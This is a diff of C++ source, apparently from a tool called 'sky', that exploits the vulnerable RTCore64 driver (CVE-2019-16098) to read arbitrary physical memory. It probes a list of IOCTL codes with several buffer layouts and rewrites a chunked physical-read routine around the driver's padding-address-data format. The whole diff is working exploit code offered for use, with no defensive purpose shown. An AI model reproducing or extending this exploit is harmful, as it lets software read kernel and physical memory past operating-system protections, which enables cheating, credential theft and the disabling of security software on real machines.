@@ -444,44 +444,115 @@ namespace sky::driver {
         if (s_ioctl_tested) return s_ioctl_read != 0;
         s_ioctl_tested = true;
 
-        DWORD codes[] = { 0x9C40258C, 0x9C40609C, 0x9C406000, 0x222400, 0x9C402580 };
-        uint8_t buf[0x1000] = {};
+        // RTCore64 uses the following protocol (verified from CVE-2019-16098 PoC):
+        // IOCTL 0x9C40258C - Read physical memory
+        // Input/Output buffer: struct {
+        //   BYTE  Padding[8];      // [0..7]   unused
+        //   ULONG_PTR Address;     // [8..15]  physical address
+        //   BYTE  Data[];           // [16..]   for read: output data follows
+        // }
+        // The DeviceIoControl returns TRUE even if returned=0
+        // The driver writes data directly starting at offset 16 of the same buffer
+
+        DWORD codes[] = { 0x9C40258C, 0x9C402580, 0x9C406000, 0x9C40609C,
+                          0x222400, 0x222004, 0x9C402400 };
 
         for (auto code : codes) {
+            uint8_t buf[0x1000] = {};
             DWORD returned = 0;
-            LARGE_INTEGER pa;
-            pa.QuadPart = 0x1000; // Read from physical address 0x1000
 
-            // Try simple LARGE_INTEGER input format
-            if (DeviceIoControl(g_hwinfo_device, code,
-                &pa, sizeof(pa),
-                buf, 0x1000,
-                &returned, nullptr)) {
-                if (returned > 0) {
-                    s_ioctl_read = code;
-                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " works (returned=" + std::to_string(returned) + " bytes)");
-                    return true;
+            // Format A: RTCore64 standard — 16-byte header + data
+            // [8 padding][8 address][rest = output]
+            {
+                memset(buf, 0, sizeof(buf));
+                uint64_t* p = (uint64_t*)buf;
+                p[0] = 0;           // padding
+                p[1] = 0x1000;      // physical address to read
+
+                if (DeviceIoControl(g_hwinfo_device, code,
+                    buf, 16 + 0x100,  // input: 16 header + space for output
+                    buf, 16 + 0x100,  // output: same buffer, enough room for data
+                    &returned, nullptr)) {
+                    // Check if we got non-zero data at offset 16
+                    uint8_t* data = buf + 16;
+                    bool has_data = false;
+                    for (int i = 0; i < 16; i++) {
+                        if (data[i] != 0) { has_data = true; break; }
+                    }
+                    if (has_data || returned > 16) {
+                        s_ioctl_read = code;
+                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                            " (header+data) works (returned=" + std::to_string(returned) + ")");
+                        return true;
+                    }
                 }
             }
 
-            // Try structured format: [8 padding][8 address][4 size]
-            struct {
-                uint8_t  pad[8];
-                uint64_t addr;
-                uint32_t size;
-            } req = {};
-            req.addr = 0x1000;
-            req.size = 0x100;
+            // Format B: Just address (8 bytes input, separate output buffer)
+            {
+                uint64_t addr = 0x1000;
+                uint8_t out[0x100] = {};
+                if (DeviceIoControl(g_hwinfo_device, code,
+                    &addr, sizeof(addr),
+                    out, sizeof(out),
+                    &returned, nullptr)) {
+                    bool has_data = false;
+                    for (int i = 0; i < 16; i++) {
+                        if (out[i] != 0) { has_data = true; break; }
+                    }
+                    if (has_data || returned > 0) {
+                        s_ioctl_read = code;
+                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                            " (addr-only) works (returned=" + std::to_string(returned) + ")");
+                        return true;
+                    }
+                }
+            }
 
+            // Format C: [8 padding][8 address][4 size] (20 bytes input)
+            {
+                memset(buf, 0, sizeof(buf));
+                uint64_t* p = (uint64_t*)buf;
+                p[0] = 0;           // padding
+                p[1] = 0x1000;      // physical address
+                *(uint32_t*)(buf + 16) = 0x100;  // size
+
+                if (DeviceIoControl(g_hwinfo_device, code,
+                    buf, 20,
+                    buf, 0x200,
+                    &returned, nullptr)) {
+                    bool has_data = false;
+                    for (int i = 0; i < 16; i++) {
+                        if (buf[i] != 0) { has_data = true; break; }
+                    }
+                    if (has_data || returned > 0) {
+                        s_ioctl_read = code;
+                        LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
+                            " (pad+addr+size) works (returned=" + std::to_string(returned) + ")");
+                        return true;
+                    }
+                }
+            }
+        }
+
+        // Last resort: try every IOCTL even if returned=0 (driver might use METHOD_NEITHER)
+        for (auto code : codes) {
+            uint8_t buf[0x1000] = {};
+            uint64_t addr = 0x1000;
+            DWORD returned = 0;
             if (DeviceIoControl(g_hwinfo_device, code,
-                &req, sizeof(req),
+                &addr, sizeof(addr),
                 buf, 0x1000,
                 &returned, nullptr)) {
-                if (returned > 0) {
+                // Even if returned=0, check if the buffer got data
+                bool has_data = false;
+                for (int i = 0; i < 64; i++) {
+                    if (buf[i] != 0) { has_data = true; break; }
+                }
+                if (has_data) {
                     s_ioctl_read = code;
                     LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " works (structured, returned=" + std::to_string(returned) + " bytes)");
+                        " (METHOD_NEITHER) works (buffer has data)");
                     return true;
                 }
             }
@@ -500,55 +571,38 @@ namespace sky::driver {
         DWORD returned = 0;
         constexpr size_t MAX_READ = 0x1000;
         size_t remaining = size;
-        size_t offset = 0;
+        size_t off = 0;
         while (remaining > 0) {
             size_t chunk = (remaining > MAX_READ) ? MAX_READ : remaining;
 
-            // Try multiple input formats to find the one this driver version uses
-            // Format 1: just LARGE_INTEGER address as input
-            LARGE_INTEGER cur;
-            cur.QuadPart = (LONGLONG)(phys_addr + offset);
+            // RTCore64 format: single buffer [8 padding][8 address][data...]
+            // The driver reads from this buffer (input) and writes data starting at offset 16
+            uint8_t iobuf[0x1100] = {};
+            uint64_t* p = (uint64_t*)iobuf;
+            p[0] = 0;                          // padding
+            p[1] = (uint64_t)(phys_addr + off); // physical address
 
+            // Send 16 bytes input, receive 16+chunk bytes output (data at offset 16)
             BOOL ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
-                &cur, sizeof(cur),
-                (BYTE*)buffer + offset, (DWORD)chunk,
+                iobuf, 16 + (DWORD)chunk,
+                iobuf, 16 + (DWORD)chunk,
                 &returned, nullptr);
 
-            if (!ok || returned == 0) {
-                // Format 2: structured [8 padding][8 address][4 size] as single buffer
-                struct {
-                    uint8_t  pad[8];
-                    uint64_t addr;
-                    uint32_t sz;
-                } req = {};
-                req.addr = phys_addr + offset;
-                req.sz = (uint32_t)chunk;
-
+            if (ok) {
+                // Data should be at offset 16 in the output buffer
+                memcpy((BYTE*)buffer + off, iobuf + 16, chunk);
+            } else {
+                // Fallback: try addr-only format
+                uint64_t addr = phys_addr + off;
                 ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
-                    &req, sizeof(req),
-                    (BYTE*)buffer + offset, (DWORD)chunk,
+                    &addr, sizeof(addr),
+                    (BYTE*)buffer + off, (DWORD)chunk,
                     &returned, nullptr);
+                if (!ok) return false;
             }
-
-            if (!ok || returned == 0) {
-                // Format 3: [8 address][4 size] (12 bytes)
-                struct {
-                    uint64_t addr;
-                    uint32_t sz;
-                } req3 = {};
-                req3.addr = phys_addr + offset;
-                req3.sz = (uint32_t)chunk;
-
-                ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
-                    &req3, sizeof(req3),
-                    (BYTE*)buffer + offset, (DWORD)chunk,
-                    &returned, nullptr);
-            }
-
-            if (!ok || returned == 0) return false;
 
             remaining -= chunk;
-            offset += chunk;
+            off += chunk;
         }
         return true;
     }
